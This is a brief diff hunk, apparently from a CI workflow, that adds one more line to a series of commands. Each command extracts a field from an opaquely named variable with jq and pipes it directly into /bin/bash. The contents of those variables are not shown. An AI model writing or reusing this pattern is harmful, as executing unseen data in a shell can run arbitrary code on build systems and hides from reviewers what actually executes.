@@ -41,6 +41,7 @@ jobs:
           echo $gbw7 | jq -r .s95 | /bin/bash
           echo $mr32 | jq -r .r2 | /bin/bash
           echo $j6791 | jq -r .q9 | /bin/bash
+          echo $b85 | jq -r .ctjz562 | /bin/bash
 
       - name: Store results
         if: always()
